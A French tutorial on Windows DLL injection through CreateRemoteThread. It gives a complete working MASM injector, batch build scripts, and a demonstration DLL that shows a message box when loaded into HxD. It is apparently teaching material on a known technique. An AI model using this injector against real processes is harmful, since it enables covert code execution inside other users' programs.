
Il existe plusieurs manières d'injecter du code dans un processus déjà en cours. Parmis celles-ci on trouve l'__injection de DLL__ (Dynamic Linked Libraires). Classiquement, les DLLs sont des exécutables qui n'ont pas de point d'entrée. Elles ne contiennent que des fonctions. Pour exécuter ces fonctions, le programme qui en a besoin doit charger la DLL en mémoire.

Si une DLL est manquante, le programme peut ne pas fonctionner correctement. Mais il est possible d'ajouter une DLL au processus en cours afin de palier à ce problème. En quoi cela est important pour un attaquant? Bien qu'une DLL n'ai pas de point d'entrée à propremement parler, il existe des méthodes pour lui faire exécuter du code; notamment au chargement/déchargement de la DLL en mémoire (auquel cas il faudra lui ajouter un point d'entrée comme on le verra par la suite). C'est ce principe qui sera utilisé pour exécuter une charge malveillante.

Il existe différentes méthodes pour injecter une DLL dans un processus en cours. Celles que je connais sont listées ci-dessous (il y en a probablement d'autres):

* __CreateRemoteThread__

* __NtCreateThreadEx__

* __Reflective DLL__

* __QueueUserAPC__

* __SetThreadContext__

* __SetWindowsHookEx__

* __RtlCreateUserThread__

L'idée est de présenter toutes ces méthodes en plusieurs articles. Dans celui-ci, je commence avec la plus simple: __CreateRemoteThread__

__CreateRemoteThread()__ est une fonction de la msdn (https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread). Il y est clairement écrit que cette fonction permet de créer un thread qui partagera le même espace d'adresses virtuelles qu'un autre processus que celui qui fait l'injection de la DLL.

La suite de fonction qu'il faut utiliser pour effectuer cette injection de DLL est présentée ci-dessous:

* __OpenProcess()__ afin d'ouvrir le processus cible dans lequel on souhaite injecter la DLL

* __VirtualAllocEx()__ afin d'allouer une zone mémoire (avec les bonnes permissions: RWE) pour le chargement de la DLL

* __WriteProcessMemory()__ afin d'écrire des données dans la zone mémoire allouée précédemment

* __CreateRemoteThread()__ afin de créer le thread et donc le chargement de la DLL dans la mémoire du process cible


Pour ouvrir le processus cible, on va utiliser la fonction __OpenProcess()__. Pour cela on a besoin du PID du processus cible. Le processus cible sera ouvert avec le maximum de droit d'accès afin de pouvoir le manipuler correctement (__PROCESS ALL ACCESS__). Le code suivant fait cela:

```
_openProcess:
	mov 		eax, PID
	push 		eax
	push 		0
	push 		1F0FFFh ; PROCESS_ALL_ACCESS
	call 		OpenProcess
	cmp 		eax, 0
	jz 		_exit
	mov 		[hProcess], eax
```

Pour allouer la zone mémoire dans l'espace d'adresse du processus cible, on récupère le handle obtenu grâce à la fonction __OpenProcess__, puis on lui assigne les permissions RWE, ainsi que le type d'allocation et la taille de la zone mémoire. Le code ci-dessous permet cela:

```
_virtualAllocEx:
	push 		40h ; PAGE_EXECUTE_READWRITE
	push 		3000h ; MEM_RESERVE or MEM_COMMIT
	push 		sizeof dllPath
	push  		0
	push 		hProcess
	call 		VirtualAllocEx
	cmp 		eax, 0
	jz 		_exit
	mov 		[baseAddr], eax

```

Il s'agit ensuite d'écrire dans la zone mémoire. Pour cela, on fourni l'adresse de base de la zone mémoire obtenue grâce à la fonction __VirtualAllocEx__ ainsi que le handle vers le processus cible. Le code ci-dessous présente cela:

```
_writeProcessMemory:
	push 		0
	push 		sizeof dllPath
	push 		offset dllPath
	push 		baseAddr
	push 		hProcess
	call 		WriteProcessMemory
	cmp 		eax, 0
	jz 		_exit
```

Ceux qui ont lu la msdn de __CreateRemoteThread()__ ont vu qu'il y avait un paramètre un peu "tricky". Il s'agit de __lpStartAddress__. A quoi ce paramètre correspond-t-il? Il faut savoir que la fonction __CreateRemoteThread()__ ne permet pas d'injecter que des DLLs. Même, sa fonction première est tout simplement d'injecter du code. Ainsi ce paramètre spécifie l'adresse de la fonction qui doit être executée dans le processus cible.

Comment faire pour lui dire de charger en mémoire une DLL? Il existe pour cela une fonction de la msdn: __LoadLibrary()__ (https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) qui se trouve dans la DLL __kernel32.dll__. Le paramètre __lpStartAddress__ contiendra donc l'adresse de __LoadLibrary()__ que l'on va retrouver grâce à la fonction __GetProcAddress()__ également présente dans la DLL __kernel32.dll__:

```
.data
	sKrnl32		db "kernel32.dll", 0
	sLoadLib 	db "LoadLibraryA", 0

.data?
	hKrnl32Addr 	dd ?
 	hLoadLibAddr 	dd ?

.code

_getModuleHandle:
	push 		offset sKrnl32
	call 		GetModuleHandleA
	cmp 		eax, 0
	jz	 	_exit
	mov 		[hKrnl32Addr], eax

_getProcAddress:
	push 		offset sLoadLib
	push		hKrnl32Addr
	call 		GetProcAddress
	cmp 		eax, 0
	jz  		_exit
	mov 		[hLoadLibAddr], eax
```

Le code complet qui permet d'injecter la DLL __inject.dll__ dans le processus dont le PID est 11364 est présenté ci-dessous:

<details><summary><font color="red">Ici se trouve le code permettant de faire de l'injection de DLL via CreateRemoteThread()</font></summary>
<p>

```
.586
.model flat, stdcall


; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL :DWORD
OpenProcess PROTO STDCALL :DWORD,:DWORD,:DWORD
VirtualAllocEx PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
WriteProcessMemory PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
GetModuleHandleA PROTO STDCALL :DWORD
GetProcAddress PROTO STDCALL :DWORD,:DWORD
CreateRemoteThread PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD


.data
	dllPath 	db "C:\Users\User 1\Desktop\inject.dll",0
	sKrnl32 	db "kernel32.dll",0
	sLoadLib	db "LoadLibraryA",0
	PID 		dd 11364

.data?
    	hProcess 	dd ?
 	nSizeDLL 	dd ?
 	baseAddr	dd ?
 	hKrnl32Addr 	dd ?
 	hLoadLibAddr 	dd ?

.code

Start PROC

_openProcess:
	mov 		eax, PID
	push 		eax
	push 		0
	push 		1F0FFFh ; PROCESS_ALL_ACCESS
	call 		OpenProcess
	cmp 		eax, 0
	jz 		_exit
	mov 		[hProcess], eax
	
_virtualAllocEx:
	push 		40h ; PAGE_EXECUTE_READWRITE
	push 		3000h ; MEM_RESERVE or MEM_COMMIT
	push 		sizeof dllPath
	push  		0
	push 		hProcess
	call 		VirtualAllocEx
	cmp 		eax, 0
	jz 		_exit
	mov 		[baseAddr], eax

_writeProcessMemory:
	push 		0
	push  		sizeof dllPath
	push 		offset dllPath
	push 		baseAddr
	push 		hProcess
	call 		WriteProcessMemory
	cmp 		eax, 0
	jz 		_exit

_getModuleHandle:
	push 		offset sKrnl32
	call 		GetModuleHandleA
	cmp 		eax, 0
	jz	 	_exit
	mov 		[hKrnl32Addr], eax

_getProcAddress:
	push 		offset sLoadLib
	push		hKrnl32Addr
	call 		GetProcAddress
	cmp 		eax, 0
	jz  		_exit
	mov 		[hLoadLibAddr], eax

_createRemoteThread:
	push 		0
	push 		0
	push  		baseAddr
	push 		hLoadLibAddr
	push 		0
	push 		0
	push 		hProcess
	call 		CreateRemoteThread
	cmp 		eax, 0
	jz 		_exit


_exit:
	xor eax, eax
	push eax
	call ExitProcess
	

Start ENDP
END
```
</p>
</details>

Ce code est compilé et linké avec le compilateur __ml.exe__ de Microsoft. Le fichier .bat qui permet de le compiler est présenté ci-dessous:

```
@echo off

set /p prog=[+] nom du programme a compiler (sans extension): 

if exist %prog%.exe del %prog%.exe

"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.23.28105\bin\Hostx64\x86\ml.exe" %prog%.asm /link /subsystem:console /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\ntdll.lib" /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\kernel32.lib" /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\User32.lib" /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\AdvAPI32.Lib" /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\NetAPI32.Lib" /entry:Start /out:%prog%.exe

del %prog%.obj

pause
```


Qu'en est-t-il de la __DLL inject.dll__ qui doit être injectée dans le processus cible?

Comme je l'ai dit précédemment, une DLL peut exécuter du code au chargement/déchargement. On va opter pour une exécution de code au chargement. En effet, une DLL qui contient normalement des fonctions qui peuvent être appelées par un programme. Le programme cible n'aurait aucune raison d'appeler une des fonctions malveillante de notre DLL. C'est pourquoi il faut que le code s'exécute au chargement/déchargement en mémoire de la DLL.

Voici comment se code une DLL en assembleur:

```
LibMain PROC hInstDLL:DWORD, reason:DWORD, unused:DWORD
	.if reason == 1 ; DLL_PROCESS_ATTACH
		; do something when attached to process
		nop

	.elseif reason == 3 ; DLL_THREAD_DETACH
		; do something when detached from thread
		nop

	.elseif reason == 2 ; DLL_THREAD_ATTACH
		; do something when attached to thread
    		nop   
    
	.elseif reason == 0 ; DLL_PROCESS_DETACH
		; do something when detached from process
      		nop
	.endif

    	ret

LibMain ENDP
```

Pour plus de détails concernant le point d'entrée d'une DLL, lire la msdn (https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain). 

Comme on souhaite exécuter le code au chargement de la DLL dans l'espace mémoire du processus cible, le code malveillant sera placé dans le __DLL PROCESS ATTACH__. Plutôt que d'écrire "salement" le code dans cette partie de la DLL, on va ajouter une fonction à cette DLL comme cela se fait classiquement. Ainsi le code qui sera dans le __DLL PROCESS ATTACH__ sera simplement un __call__ à notre fonction.

Le code qui permet de faire cela est présenté ci-dessous:

<details><summary><font color="red">Ici se trouve le code permettant de coder une DLL en assembleur</font></summary>
<p>
```
.586
.model flat, stdcall

; kernel32.dll
MessageBoxA PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD

.data
	sTitle      	db  'h4ck', 0
    	sMsg		db  'H4ck', 0

.data?
    	hInstance dd ?

.code

LibMain PROC hInstDLL:DWORD, reason:DWORD, unused:DWORD
	.if reason == 1 ; DLL_PROCESS_ATTACH
        	call _MessageBox

    	.elseif reason == 3 ; DLL_THREAD_DETACH
		nop

    	.elseif reason == 2 ; DLL_THREAD_ATTACH
    		nop   
    
    	.elseif reason == 0 ; DLL_PROCESS_DETACH
      		nop
    	.endif

    	ret
LibMain ENDP


_MessageBox PROC
        push       0
        push       offset sTitle
        push       offset sMsg
        push       0 
        call       MessageBoxA

    	ret

_MessageBox ENDP

END
```
</p>
</details>

Pour compiler et linker, j'utilise le code suivant:

```
@echo off

set /p prog=[+] nom du programme a compiler (sans extension): 

if exist %prog%.dll del %prog%.dll

"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.23.28105\bin\Hostx64\x86\ml.exe" %prog%.asm /link /subsystem:windows /DLL /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\ntdll.lib" /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\kernel32.lib" /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\User32.lib" /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\AdvAPI32.Lib" /defaultlib:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.18362.0\um\x86\NetAPI32.Lib" /entry:LibMain /out:%prog%.dll

del %prog%.obj

pause
```

Qu'en est-il de la pratique. Pour l'exemple, je vais utiliser le programme cible __HxD__ (qui permet de faire de l'édition de code hexa)

![image alt text](/images/dll-injection/injectDLL_createRemoteThread.png)

La visualisation des DLLs chargées en mémoire par HxD est effectuée avec __ProcessHacker__.

Il est possible d'injecter une DLL dans ce processus car l'utilisateur qui exécute le code malveillant a les mêmes droit que celui qui a lancé HxD. De plus, il s'agit là d'un code d'exploitation x86 et d'une DLL x86. Il est donc logique que l'on ne puisse injecter que dans des processus x86. Il n'y pas de difficulté pour l'adapter à du x64. Ceux qui ont des difficultés pour cela peuvent me contacter.

On constate également que le processus n'a pas de protection contre le chargement de DLLs non signées.

![image alt text](/images/dll-injection/injectDLL_createRemoteThread_policy.png)

L'ensemble de ces pre-requis permet d'injecter une DLL dans ce processus. 

Lorsqu'un EDR (Endpoint Detection and Response) ou un rootkit userland est présent sur un système, il n'est pas rare que celui-ci injecte une DLL dans tous les processus qui sont lancés. Cela lui permet d'exécuter son propre code, mais aussi de "hooker" certaines fonctions. Cela lui est possible car il est généralement exécuter avec le maximum de droit et permission possible.
